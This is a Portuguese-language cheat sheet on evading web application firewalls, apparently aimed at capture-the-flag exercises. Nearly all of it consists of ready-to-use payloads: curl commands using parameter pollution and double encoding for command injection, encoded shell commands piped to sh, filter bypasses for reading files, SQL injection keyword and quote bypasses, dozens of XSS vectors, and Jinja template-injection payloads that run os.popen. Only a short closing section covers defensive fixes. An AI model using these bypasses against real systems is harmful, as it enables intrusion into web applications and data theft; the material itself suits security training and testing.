# WAF Evasion — Guia Completo

> Técnicas para contornar filtros e Web Application Firewalls que bloqueiam payloads maliciosos.

## Conceito

Um WAF (ou filtro de input) inspeciona os pedidos HTTP e bloqueia os que contêm padrões maliciosos (ex: `; cat`, `<script>`, `UNION SELECT`). A evasão explora **diferenças** entre o que o WAF vê e o que a aplicação processa.

---

## Técnicas universais

### 1. HTTP Parameter Pollution (HPP)
O WAF vê um valor, a app usa outro. Depende do framework:

| Tecnologia | Comportamento com `?a=1&a=2` |
|------------|-------------------------------|
| PHP | Último: `a=2` |
| Python (Flask/Django) | Primeiro: `a=1` |
| ASP.NET | Concatena: `a=1,2` |
| Node.js (Express) | Último: `a=2` |
| Java (Servlet) | Primeiro: `a=1` |

```bash
# Se WAF vê o primeiro, app usa o último (ou vice-versa)
curl "http://TARGET/run?cmd=ls&cmd=ls;cat+/flag/flag"
```

### 2. Double encoding
```
Normal:    ;     →  %3b
Double:    %3b   →  %253b
```
O WAF descodifica 1x (%253b → %3b) e vê `%3b` — não reconhece como `;`.
A app descodifica 2x (%3b → `;`) e executa.

```bash
curl "http://TARGET/run?cmd=ls%253bcat+/flag/flag"

# Outros caracteres double-encoded:
# space = %20 → %2520
# '     = %27 → %2527
# <     = %3c → %253c
# >     = %3e → %253e
```

### 3. Case variation
SQL e muitos comandos são case-insensitive:
```sql
SeLeCt * FrOm vault
uNiOn SeLeCt 1,2,3
```

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

### 4. Comentários inline

**SQL:**
```sql
UN/**/ION SE/**/LECT 1,2,3
SEL/*bypass*/ECT * FROM vault
```

**HTML/JS:**
```html
<scr<!--bypass-->ipt>alert(1)</script>
```

### 5. Encoding alternativo

```bash
# Octal (printf)
$(printf '\143\141\164 /\146\154\141\147/\146\154\141\147')
# = cat /flag/flag

# Hex (printf)
$(printf '\x63\x61\x74 /\x66\x6c\x61\x67/\x66\x6c\x61\x67')
# = cat /flag/flag

# Base64
$(echo Y2F0IC9mbGFnL2ZsYWc= | base64 -d | sh)
# = cat /flag/flag

# Unicode (para WAFs web)
cat    # cat em unicode escapes
```

---

## Bypasses para OS Command Injection

### Espaços bloqueados
```bash
cat${IFS}/flag/flag              # $IFS = space/tab/newline
cat</flag/flag                   # input redirection (< sem espaço)
{cat,/flag/flag}                 # brace expansion
cat$'\x20'/flag/flag             # $'' quoting com hex
X=$'\x20';cat${X}/flag/flag      # variável com espaço
cat%09/flag/flag                 # tab (%09) em URLs
```

### Palavras bloqueadas ("cat", "flag", etc.)
```bash
# Concatenação com quotes vazias
c'a't /flag/flag
c""at /flag/flag
c\at /flag/flag

# Variáveis
a=ca;b=t;$a$b /flag/flag

# Wildcards
/bin/c?t /fla?/fla?
/bin/ca* /fla*/fla*

# Alternativas ao cat
head /flag/flag
tail /flag/flag
tac /flag/flag
less /flag/flag
more /flag/flag
nl /flag/flag
sort /flag/flag
rev /flag/flag | rev
xxd /flag/flag
base64 /flag/flag
dd if=/flag/flag
cp /flag/flag /dev/stdout
```

### Path bloqueado ("/flag/flag")
```bash
cd /flag && cat flag
cat /fla?/fla?
cat /flag/*
readlink -f /flag/../flag/flag | xargs cat
```

### Separadores bloqueados ("; | &")
```bash
# Newline
%0a                              # URL encoded
$'\n'                            # bash quoting

# CRLF
%0d%0a                           # URL encoded
```

---

## Bypasses para SQL Injection

### UNION/SELECT bloqueado
```sql
-- Comentários inline
UN/**/ION SE/**/LECT 1,2
UNI%6FN SEL%45CT 1,2            -- URL encoding parcial

-- Case
uNiOn SeLeCt 1,2

-- Double keyword
UNUNIONION SELSELECTECT 1,2     -- se WAF remove "UNION" e "SELECT" uma vez
```

### Espaços bloqueados em SQL
```sql
UNION/**/SELECT/**/1,2
UNION%09SELECT%091,2             -- tab
UNION%0aSELECT%0a1,2            -- newline
UNION(SELECT(1),(2))             -- parenteses
```

### Quotes bloqueadas
```sql
-- Hex para strings (MySQL)
SELECT * FROM vault WHERE name = 0x61646d696e    -- "admin"

-- CHAR() para strings
SELECT * FROM vault WHERE name = CHAR(97,100,109,105,110)

-- Sem quotes no LIKE
SELECT * FROM vault WHERE name LIKE 0x25        -- %
```

### WHERE bloqueado
```sql
-- Usar HAVING
SELECT * FROM vault HAVING 1=1

-- Subquery
SELECT * FROM (SELECT * FROM vault) x
```

---

## Bypasses para XSS

### `<script>` bloqueado
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### `alert` bloqueado
```javascript
confirm(1)
prompt(1)
window['al'+'ert'](1)
eval('al'+'ert(1)')
self['alert'](1)
top['alert'](1)
this['alert'](1)
[1].find(alert)
```

### `()` bloqueadas
```javascript
alert`1`                          // template literal
onerror=alert                     // event handler sem ()
throw 1;onerror=alert             // throw trigger
```

### `on` bloqueado (event handlers)
```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
```

### Tags HTML bloqueadas
```html
<!-- Encoding -->
&#x3C;img src=x onerror=alert(1)&#x3E;

<!-- SVG namespace -->
<svg><script>alert(1)</script></svg>

<!-- Math namespace -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

---

## Bypasses para SSTI

### `{{` bloqueado
```python
# Usar block tags
{% print(cycler.__init__.__globals__.os.popen('cat /flag/flag').read()) %}

# Usar comment+block
{%- print(...) -%}
```

### `_` (underscore) bloqueado
```python
# request.args
{{ ()|attr(request.args.a) }}?a=__class__

# Hex
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
```

### `.` (ponto) bloqueado
```python
# Bracket notation
{{ ''['__class__']['__mro__'][1] }}

# |attr filter
{{ ''|attr('__class__') }}
```

---

## Metodologia de evasão

```
1. Confirmar que há filtro
   └── O payload direto dá erro/bloqueio? WAF message?

2. Identificar o que é bloqueado
   ├── Testar cada componente isolado
   │   ex: "UNION" sozinho é bloqueado? "SELECT" sozinho?
   │       ";" é bloqueado? "|"? "$("?
   └── Isto diz-te EXACTAMENTE o que filtrar

3. Escolher técnica de bypass
   ├── Palavra bloqueada → case variation, comments, concatenação
   ├── Caracter bloqueado → encoding (URL, double, hex, octal)
   ├── Pattern bloqueado → HPP, chunked encoding
   └── Tudo bloqueado → testar newlines, double encoding

4. Testar incrementalmente
   └── Começar com bypass simples, escalar se necessário
```

---

## Tabela rápida de referência

| Bloqueado | Bypass |
|-----------|--------|
| espaço | `${IFS}`, `%09` (tab), `/**/`, `()` |
| `;` | `%0a` (newline), `%253b` (double-encode) |
| `cat` | `c'a't`, `c\at`, `head`, `tail`, `tac` |
| `/flag` | `/fla?`, `/fla*`, `cd /flag && cat flag` |
| `UNION` | `UN/**/ION`, `uNiOn`, `%55NION` |
| `SELECT` | `SE/**/LECT`, `SeLeCt`, `%53ELECT` |
| `<script>` | `<img onerror=`, `<svg onload=` |
| `alert` | `confirm`, `prompt`, ``alert`1` `` |
| `{{` | `{%`, `{%-` |
| `_` | `\x5f`, `request.args` |
| quotes | hex `0x61646d696e`, `CHAR()`, sem quotes |

---

## Fix (perspetiva defensiva)

- **Não confiar em blacklists** — há sempre bypass
- Usar **whitelists** (aceitar só o que é válido)
- **Parameterized queries** para SQL (não filtrar — não concatenar)
- **Template variables** para SSTI (não filtrar — não template-izar input)
- **CSP** para XSS (não filtrar — Content-Security-Policy)
- **Listas de argumentos** para OS injection (não filtrar — não usar shell)
- WAF como **defesa em profundidade**, nunca como única proteção
